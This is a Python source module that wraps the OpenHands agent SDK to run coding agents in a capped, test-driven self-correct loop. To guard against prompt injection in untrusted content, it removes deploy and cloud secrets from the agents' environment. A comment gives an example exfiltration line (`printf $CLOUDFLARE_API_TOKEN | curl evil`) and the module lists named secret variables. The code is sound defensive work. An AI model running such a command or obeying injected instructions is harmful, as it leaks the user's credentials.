"""area.engine — thin adapter over the (pinned) OpenHands software-agent-sdk.

Why this module exists:
- One place that knows the SDK API, so SDK churn is contained here (the SDK
  ships weekly, sometimes breaking releases).
- Two agent backends:
    * "acp" -> Claude Code via ACP. Uses your Claude Code login, NO api key.
    * "llm" -> OpenHands-native agent via LiteLLM. Needs LLM_API_KEY + LLM_MODEL.
- A keyless, test-driven self-correct loop (`run_until`): the "oracle" for
  "done" is YOUR acceptance checks passing, not an LLM judge. This is what lets
  the self-correct loop work on the no-key ACP backend. `run_goal_judged` keeps
  the SDK's judge-LLM loop available for when a judge key is present.

Pinned against openhands-sdk 1.55.1. APIs used here were verified against the
installed package, not guessed.
"""
from __future__ import annotations

import contextlib
import os
import subprocess
import sys
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING, Any, Callable, Literal, Optional, Sequence

from openhands.sdk import LLM, Agent, Conversation, Tool
from openhands.sdk.agent import ACPAgent
from openhands.sdk.agent.base import AgentBase
from openhands.sdk.settings.acp_providers import ACP_PROVIDERS
from openhands.tools.file_editor import FileEditorTool
from openhands.tools.task_tracker import TaskTrackerTool
from openhands.tools.terminal import TerminalTool

# stdlib-only leaf, so importing it at module level costs nothing
from area._util import CMD_TIMEOUT_DEFAULT as _UTIL_CMD_TIMEOUT_DEFAULT
from area._util import cmd_timeout, kill_process_group

if TYPE_CHECKING:
    from openhands.sdk.conversation.goal import GoalOutcome
    from openhands.sdk.mcp.config import MCPServer

Backend = Literal["acp", "llm"]

# Default toolset for the native (llm) backend. The ACP backend brings its own
# tools from the Claude Code CLI, so this does not apply there.
_DEFAULT_TOOLS = [TerminalTool, FileEditorTool, TaskTrackerTool]


def _filter_kwargs(cls: type, kwargs: dict[str, Any]) -> dict[str, Any]:
    """Keep only kwargs that are real model fields and not None.

    Defensive against SDK field renames between pinned bumps.
    """
    fields = getattr(cls, "model_fields", {})
    return {k: v for k, v in kwargs.items() if k in fields and v is not None}


def build_agent(
    backend: Backend = "acp",
    *,
    model: Optional[str] = None,
    mcp_config: Optional[dict[str, MCPServer]] = None,
    acp_provider: str = "claude-code",
) -> AgentBase:
    """Construct an agent.

    - backend="acp": drives the Claude Code CLI via ACP using your existing
      login (no API key). `model` is an ACP model alias (e.g. "sonnet").
    - backend="llm": OpenHands-native agent; needs LLM_API_KEY + LLM_MODEL
      (or pass `model=`).

    `mcp_config` is a dict[str, MCPServer] (e.g. REA, Vercel) wired into the
    agent for both backends.
    """
    if backend == "acp":
        kwargs = {
            "acp_command": list(ACP_PROVIDERS[acp_provider].default_command),
            "acp_model": model,
            "mcp_config": mcp_config,
        }
        return ACPAgent(**_filter_kwargs(ACPAgent, kwargs))

    if backend == "llm":
        api_key = os.getenv("LLM_API_KEY")
        model = model or os.getenv("LLM_MODEL")
        if not api_key or not model:
            raise RuntimeError(
                "llm backend needs LLM_API_KEY and LLM_MODEL (or pass model=)."
            )
        llm = LLM(
            model=model, api_key=api_key, base_url=os.getenv("LLM_BASE_URL") or None
        )
        kwargs = {
            "llm": llm,
            "tools": [Tool(name=t.name) for t in _DEFAULT_TOOLS],
            "mcp_config": mcp_config,
        }
        return Agent(**_filter_kwargs(Agent, kwargs))

    raise ValueError(f"unknown backend: {backend!r}")


@dataclass
class VerifyResult:
    """Outcome of an acceptance check: ok + human/agent-readable feedback."""

    ok: bool
    feedback: str = ""


Verifier = Callable[[], VerifyResult]


def _mk_conversation(
    agent: AgentBase, ws: Path, agent_iters: int | None, budget: float | None
) -> Conversation:
    """Build a Conversation with per-run caps (P2 cost/budget guard).

    agent_iters caps steps per agent.run() (default 80; env AREA_AGENT_ITERS;
    the SDK default is 500). budget caps USD spend per run (env AREA_MAX_BUDGET).
    Budget needs LocalConversation (the Conversation factory omits it).
    """
    if agent_iters is None:
        agent_iters = int(os.getenv("AREA_AGENT_ITERS", "80"))
    if budget is None:
        b = os.getenv("AREA_MAX_BUDGET")
        budget = float(b) if b else None
    if budget is not None:
        try:
            from openhands.sdk.conversation.impl.local_conversation import (
                LocalConversation,
            )

            return LocalConversation(
                agent=agent, workspace=str(ws),
                max_iteration_per_run=agent_iters, max_budget_per_run=budget,
            )
        except Exception as e:  # noqa: BLE001
            # Don't silently drop a cost-safety control — warn, then fall back to
            # the iteration-cap-only factory.
            print(f"[area] ⚠ could not apply --budget cap (${budget}); using the "
                  f"iteration cap only: {type(e).__name__}: {str(e)[:80]}")
    return Conversation(
        agent=agent, workspace=str(ws), max_iteration_per_run=agent_iters
    )


# Specific phrases only — a bare "rate" matched "generate"/"accurate"/"separate"
# and "connection" matched "invalid connection string", so permanent errors were
# retried 5× with long backoff. Keep each token distinctive to a transient fault.
def mcp_stdio_server(*, command: str, args: Sequence[str],
                     env: Optional[dict[str, str]] = None, description: str = "") -> MCPServer:
    """Build a stdio MCPServer config — keeps the OpenHands SDK import inside this
    one seam (callers like area/re must not import the SDK directly)."""
    from openhands.sdk.mcp.config import MCPServer

    return MCPServer(transport="stdio", command=command, args=list(args),
                     env=env or {}, description=description)


def ask_cli(prompt: str, *, model: Optional[str] = None, timeout: float = 180.0,
            label: str = "ask") -> str:
    """Keyless single-shot through the ONE engine seam: run `claude -p` in a
    throwaway empty dir and return stdout. Used by the independent reviewers
    (spec-review, product-fit) and the dashboard intake chat, so every agent call
    goes through this module — logged to obs (cost/determinism visibility) and
    honoring --model. Raises on failure (callers degrade). NOTE: the claude CLI
    reports no cost, so --budget cannot be enforced here — a documented limitation,
    not a silent drop."""
    import tempfile
    import time as _t

    cmd = ["claude", "-p"]
    if model:
        cmd += ["--model", model]
    cmd.append(prompt)
    t0 = _t.time()
    ok = False
    try:
        with tempfile.TemporaryDirectory() as d:
            # env=scrubbed_env(): `claude -p` is an AGENT session with tool access,
            # prompted with content AREA did not write. It authenticates from the Claude
            # Code login in HOME, never from a key in this list, so removing the
            # deploy/cloud tokens costs it nothing.
            proc = subprocess.run(cmd, cwd=d, capture_output=True, text=True,
                                  timeout=timeout, env=scrubbed_env())
        if proc.returncode != 0:
            raise RuntimeError(proc.stderr.strip()[:200] or "claude -p failed")
        ok = True
        return proc.stdout
    finally:
        try:
            from area import obs

            obs.log_run(label, duration=_t.time() - t0, cost=None, passed=ok,
                        backend="claude-cli")
        except Exception:  # noqa: BLE001
            pass


_TRANSIENT = ("rate limit", "rate_limit", "ratelimit", "429", "529", "overloaded",
              "server error", "service unavailable", "temporarily unavailable",
              "timeout", "timed out", "etimedout", "econnreset", "econnrefused",
              "connection reset", "connection refused")


# Deploy/cloud secrets that must NOT be in the agent's terminal environment while
# it processes UNTRUSTED content (cloned source, web research, a reverse-engineered
# app). A prompt-injection in that content could otherwise `printf $CLOUDFLARE_API_TOKEN
# | curl evil`. Deploy runs in a SEPARATE, non-agent phase (area/deploy/*), so
# stripping these for the agent run doesn't break deploy. LLM/provider keys are NOT
# stripped — the agent needs them to think.
_AGENT_SECRET_ENV = (
    "CLOUDFLARE_API_TOKEN", "CLOUDFLARE_ACCOUNT_ID", "CF_API_TOKEN", "CF_ACCOUNT_ID",
    "VERCEL_TOKEN", "AREA_POSTGRES_URL", "POSTGRES_URL", "DATABASE_URL",
    "KV_REST_API_URL", "KV_REST_API_TOKEN", "AREA_GUI_TOKEN", "GITHUB_TOKEN", "GH_TOKEN",
)


def scrubbed_env(base: Optional[dict[str, str]] = None) -> dict[str, str]:
    """A copy of the environment with the deploy/cloud secrets removed, for passing as
    `env=` to a subprocess that runs AGENT-AUTHORED code.

    Preferred over `_scrubbed_agent_env()` wherever a subprocess is being launched: it
    hands the child a filtered environment instead of mutating `os.environ` in the
    parent, so there is no window in which this process is missing its own credentials
    and nothing else in it can observe the removal.

    Only the named keys are dropped — PATH, HOME, npm/node configuration and everything
    else a build needs are preserved, which is what makes this safe to apply to the
    build and test commands themselves."""
    env = dict(os.environ if base is None else base)
    for k in _AGENT_SECRET_ENV:
        env.pop(k, None)
    return env


@contextlib.contextmanager
def _scrubbed_agent_env() -> Iterator[None]:
    """Remove deploy/cloud secrets from os.environ for the duration of an agent run
    (restored on exit, including on error), so untrusted content the agent reads
    can't exfiltrate them via the terminal tool. See `_AGENT_SECRET_ENV`."""
    saved = {k: os.environ.pop(k) for k in _AGENT_SECRET_ENV if k in os.environ}
    try:
        yield
    finally:
        os.environ.update(saved)


def _send_and_run(conv: Conversation, message: str) -> None:
    """Send a message and run the agent with the deploy/cloud secrets removed for the
    WHOLE exchange, not just for `run()`.

    Why the whole exchange: `send_message` can itself initialize the agent — for a
    non-ACP backend `LocalConversation._should_initialize_agent_on_send_message()`
    returns True — and an initialized agent spawns a long-lived terminal that inherits
    the parent environment at spawn time. Scrubbing only around `run()` would let that
    shell keep the secrets for the rest of the run. For the default ACP backend the
    spawn is deferred into `run()`, so this was not exploitable there; it is closed so
    the posture no longer depends on which backend happens to be in use.

    `_scrubbed_agent_env` nests harmlessly (the inner one finds nothing to pop and
    restores nothing), so `_run_retry` keeps its own guard for direct callers."""
    with _scrubbed_agent_env():
        conv.send_message(message)
        _run_retry(conv)


def _run_retry(conv: Conversation, *, tries: int = 5, base: float = 15.0) -> None:
    """conv.run() with exponential backoff on transient errors (rate-limit etc.)."""
    import time as _t

    for i in range(tries):
        try:
            with _scrubbed_agent_env():
                conv.run()
            return
        except Exception as e:  # noqa: BLE001
            msg = str(e).lower()
            if i == tries - 1 or not any(k in msg for k in _TRANSIENT):
                raise
            delay = base * (2 ** i)
            print(f"[area] transient error ({type(e).__name__}); retry in {delay:.0f}s…")
            _t.sleep(delay)


def _profile_defaults(label: str) -> dict[str, Any]:
    """Per-kind knobs from profiles/<kind>.yaml. Best-effort — a missing or broken
    profile just means the global defaults apply, exactly as before profiles existed."""
    try:
        from area.profile import defaults_for

        return defaults_for(label)[2]
    except Exception:  # noqa: BLE001
        return {}


def _cap(explicit: Any, env_name: str, profile_val: Any, cast: Any) -> Any:
    """Resolve a resource cap by precedence: an explicit kwarg > the CLI flag (delivered
    via env) > the per-kind profile default > the global default (left to
    _mk_conversation). A profile value used to silently SHADOW --budget/--agent-iters
    because the profile default was applied before the env was read (finding B7); reading
    the CLI flag first makes the documented "a CLI flag always wins" true again."""
    if explicit is not None:
        return explicit
    raw = os.getenv(env_name)
    if raw:
        try:
            return cast(raw)
        except ValueError:
            pass
    return profile_val


def run_once(
    agent: AgentBase, workspace: str | Path, message: str, *,
    agent_iters: int | None = None, budget: float | None = None, label: str = "agent",
) -> Conversation:
    """Send one message and run the agent to completion (capped).

    An unspecified cap falls back to this kind's profile before the global default,
    so a per-kind budget is set in one reviewable file; an explicit argument (i.e. a
    CLI flag) always wins."""
    import time as _t

    _d = _profile_defaults(label)
    agent_iters = _cap(agent_iters, "AREA_AGENT_ITERS", _d.get("agent_iters"), int)
    budget = _cap(budget, "AREA_MAX_BUDGET", _d.get("budget_usd"), float)
    t0 = _t.time()
    ws = Path(workspace)
    ws.mkdir(parents=True, exist_ok=True)
    conv = _mk_conversation(agent, ws, agent_iters, budget)
    _send_and_run(conv, message)
    try:
        from area import obs

        # NO `passed=` on purpose. `run_once` has no Verifier — it sends one message
        # and runs the agent to completion. Recording `passed=True` here claimed a
        # verdict nobody measured, and `area evals` grades `pass_rate` off this
        # ledger, so the gate on changes to the factory's own prompts was reading a
        # constant. `obs.log_run` defaults `passed=None` and `evals.metrics` already
        # excludes unjudged runs ("None where it cannot be computed — never 0"), so
        # leaving it unset is what makes the metric honest. A caller that DOES verify
        # afterwards (e.g. holdout authoring checking the files landed) should log its
        # own verdict; it must not be inferred from "the agent finished".
        obs.log_run(label, duration=_t.time() - t0, cost=obs.cost_of(conv),
                    backend=type(agent).__name__)
    except Exception:
        pass
    return conv


# Asked for in the SAME turn that fixes the failure, so extracting a lesson costs no
# extra model call — and it is asked of the only party that knows the answer. The loop
# sees what BROKE (`result.feedback`); only the agent that changed the code knows what
# FIXED it, which is why storing a symptom alone produced garbage (F1a).
_LESSON_REQUEST = (
    "\n\n--- after the checks pass ---\n"
    "If your fix makes them pass, also write a file `.area-lesson.md` in this "
    "directory with exactly two lines, so a future build of a different app avoids "
    "the same trap:\n"
    "SYMPTOM: <the underlying cause in one line — not the error text>\n"
    "FIX: <what you changed to resolve it>\n"
    "Write it ONLY if the checks actually pass, only about this failure, and keep "
    "each line under 300 characters. Do not include credentials, tokens, URLs with "
    "secrets, or absolute paths from this machine. Skip the file entirely if the "
    "cause was specific to this one app and would not help anyone else."
)


def _harvest_lesson(workspace: str | Path, label: str) -> bool:
    """Read, sanitise, store and DELETE the lesson the agent left behind.

    Deleted either way: the file sits in the app directory, so leaving it would put
    it in the artifact digest that provenance attests. Redacted before storage
    because the text is agent-written from error output that may quote a token, and
    it will be injected into later prompts — `area.screen` is the same filter the
    clone path uses on untrusted input. docs/harness2-gap-assessment.md F1b.
    """
    from area import memory

    f = Path(workspace) / memory.LESSON_FILE
    try:
        if not f.is_file():
            return False
        raw = f.read_text(errors="ignore")[:4000]
    except OSError:
        return False
    finally:
        try:
            f.unlink(missing_ok=True)
        except OSError:
            pass

    symptom, fix = memory.parse_lesson(raw)
    if not symptom or not fix:
        return False
    try:
        from area.screen import redact_text

        symptom, s_hits = redact_text(symptom)
        fix, f_hits = redact_text(fix)
        if s_hits or f_hits:
            print(f"[area] lesson: redacted {len(s_hits) + len(f_hits)} secret-shaped "
                  "value(s) before storing")
    except Exception:  # noqa: BLE001 — never fail a green build over bookkeeping
        pass
    # dedupe: `[label.split(':')[0], label]` gave ['spec','spec'] for a flat label
    tags = list(dict.fromkeys([label.split(":")[0], label]))
    try:
        memory.remember(symptom=symptom, fix=fix, tags=tags)
        print(f"[area] lesson learned ({label}): {symptom[:80]}")
        return True
    except Exception:  # noqa: BLE001
        return False


def run_until(
    agent: AgentBase,
    workspace: str | Path,
    task: str,
    verify: Verifier,
    *,
    max_iters: int | None = None,
    agent_iters: int | None = None,
    budget: float | None = None,
    label: str = "agent",
) -> tuple[bool, Conversation]:
    """Keyless self-correct loop.

    Run the agent on `task`, then call `verify()`. While it fails, feed the
    check output back and run again, up to `max_iters` times. The oracle is
    `verify` (e.g. your pytest/E2E/build), so this works with the no-key ACP
    backend. Returns (passed, conversation).
    """
    import time as _t

    _d = _profile_defaults(label)
    agent_iters = _cap(agent_iters, "AREA_AGENT_ITERS", _d.get("agent_iters"), int)
    budget = _cap(budget, "AREA_MAX_BUDGET", _d.get("budget_usd"), float)
    if max_iters is None:
        max_iters = _d.get("max_iters") or 5
    t0 = _t.time()
    ws = Path(workspace)
    ws.mkdir(parents=True, exist_ok=True)
    conv = _mk_conversation(agent, ws, agent_iters, budget)
    _send_and_run(conv, task)

    passed = False
    used = max_iters
    first_fail = None   # the evidence that this run had something to overcome
    wall = _wall_timeout()
    for attempt in range(1, max_iters + 1):
        # The verifier runs the GENERATED app: `npm install` executes whatever
        # `postinstall` the agent wrote, then its build and its tests. The scrub used to
        # cover only the agent exchange (`_send_and_run`), so those commands inherited
        # the full environment — cloud tokens included — from this process. A Verifier is
        # an arbitrary callable and may launch subprocesses that inherit `os.environ`
        # (the holdout oracle does), so this needs the context manager and not just
        # `command_verifier`'s `env=`.
        with _scrubbed_agent_env():
            result = verify()
        if result.ok:
            passed, used = True, attempt
            break
        if first_fail is None:
            first_fail = result.feedback
        elapsed = _t.time() - t0
        if wall > 0 and elapsed > wall:
            # Stop THRASHING rather than grinding through the remaining attempts: each
            # one costs real money and the loop has already shown it is not converging.
            print(f"[area] ⏱ wall-clock cap hit ({elapsed:.0f}s > {wall:.0f}s) after "
                  f"attempt {attempt}/{max_iters} — stopping the loop. Raise "
                  "AREA_MAX_WALL_S to allow longer.")
            used = attempt
            break
        _send_and_run(
            conv,
            "The acceptance checks did not pass yet. Fix the code so they pass.\n\n"
            f"--- check output (attempt {attempt}/{max_iters}) ---\n{result.feedback}"
            + _LESSON_REQUEST
        )
    else:
        with _scrubbed_agent_env():
            passed = verify().ok

    try:
        from area import obs

        obs.log_run(label, duration=_t.time() - t0, cost=obs.cost_of(conv),
                    outer_iters=used, passed=passed, backend=type(agent).__name__)
    except Exception:
        pass
    # P6 memory: harvest the lesson the agent wrote while fixing (F1b). Only a run
    # that actually failed and then passed has one to give: `first_fail` is the
    # evidence that the loop had something to overcome.
    if passed and used > 1 and first_fail:
        _harvest_lesson(workspace, label)
    # B9: the lesson file must never reach the artifact digest. _harvest_lesson deletes
    # it when it runs (failed-then-passed only); delete it here unconditionally so a
    # failed or first-try-green run cannot leave it behind for provenance to hash.
    from area import memory

    (Path(workspace) / memory.LESSON_FILE).unlink(missing_ok=True)
    return passed, conv


# Wall clock for one verifier command (`npm install && build && test`). Read at CALL
# time, never at import: a value captured at import can't be changed for a running
# process, which is the stale-oracle trap AREA already hit with gate checkers.
# Kept as a name for compatibility; the definition lives in area._util so the build,
# nfr, demo and export commands share exactly this dial.
_CMD_TIMEOUT_DEFAULT = _UTIL_CMD_TIMEOUT_DEFAULT


def _cmd_timeout() -> float:
    return cmd_timeout()


# Wall clock for a WHOLE self-correct loop. The hard cost gate is post-hoc — it blocks
# a deploy after the money is spent — so a thrashing agent needs a clock, not just a
# budget. Observed real builds run ~900s (taskboard: 917s), so 1h is ~4x the worst case
# measured, not a guess. Read at call time; 0/negative disables it.
_WALL_TIMEOUT_DEFAULT = 3600.0


def _wall_timeout() -> float:
    raw = (os.getenv("AREA_MAX_WALL_S") or "").strip()
    try:
        return float(raw) if raw else _WALL_TIMEOUT_DEFAULT
    except ValueError:
        return _WALL_TIMEOUT_DEFAULT


def command_verifier(cmd: Sequence[str], *, cwd: str | Path | None = None,
                     timeout: float | None = None) -> Verifier:
    """A Verifier that runs a shell command; exit code 0 means pass.

    Capped on purpose. This is the longest-running call in a build and it had NO
    timeout, so a hung `npm install` or a dev server that never exits would wedge the
    whole run — with the cost gate unable to help, since it only measures after the
    fact. A timeout is reported as an ordinary failure so `run_until` can feed it back
    to the agent instead of crashing, and the whole process GROUP is killed: the
    command forks children, and signalling one pid leaves them running.

    The command runs with the deploy/cloud secrets REMOVED. Every caller of this runs a
    command out of an AGENT-AUTHORED `package.json` in the generated app — `npm install`
    (which executes arbitrary `postinstall` scripts), `npm run build`, `npx vitest`,
    `npx playwright`, `npm audit` — so these subprocesses must not inherit the tokens
    that can deploy or reach a database. No deploy path uses this function; `area.deploy`
    makes its own calls and keeps its credentials."""

    def _run() -> VerifyResult:
        cap = _cmd_timeout() if timeout is None else timeout
        try:
            proc = subprocess.Popen(
                list(cmd),
                cwd=str(cwd) if cwd else None,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=scrubbed_env(),
                start_new_session=True,  # required for the group kill below
            )
        except OSError as e:  # missing binary, bad cwd, etc. — never crash the loop
            return VerifyResult(ok=False, feedback=f"verifier command failed: {e}")
        try:
            stdout, stderr = proc.communicate(timeout=cap)
        except subprocess.TimeoutExpired:
            kill_process_group(proc)
            stdout, stderr = proc.communicate()
            tail = ((stdout or "") + "\n" + (stderr or "")).strip()[-3000:]
            return VerifyResult(ok=False, feedback=(
                f"verifier command TIMED OUT after {cap:.0f}s and was killed "
                f"(AREA_CMD_TIMEOUT to change it). Last output:\n{tail}"))
        out = ((stdout or "") + "\n" + (stderr or "")).strip()
        return VerifyResult(ok=proc.returncode == 0, feedback=out[-4000:])

    return _run


def pytest_verifier(test_path: str | Path, *, cwd: str | Path | None = None) -> Verifier:
    """Convenience Verifier: run pytest on `test_path` with the current python."""
    return command_verifier(
        [sys.executable, "-m", "pytest", "-q", str(test_path)], cwd=cwd
    )


def run_goal_judged(
    conversation: Conversation,
    objective: str,
    *,
    judge_model: str,
    max_iterations: int = 10,
) -> GoalOutcome:
    """Optional: the SDK's judge-LLM goal loop.

    NOTE: the judge is a real LLM, so this path needs a key (JUDGE_API_KEY or
    LLM_API_KEY). Prefer `run_until` for the keyless ACP path.
    """
    from openhands.sdk.conversation.goal import run_goal

    api_key = os.getenv("JUDGE_API_KEY") or os.getenv("LLM_API_KEY")
    if not api_key:
        raise RuntimeError("run_goal judge needs JUDGE_API_KEY or LLM_API_KEY.")
    judge_llm = LLM(
        model=judge_model, api_key=api_key, base_url=os.getenv("LLM_BASE_URL") or None
    )
    return run_goal(conversation, objective, judge_llm, max_iterations=max_iterations)
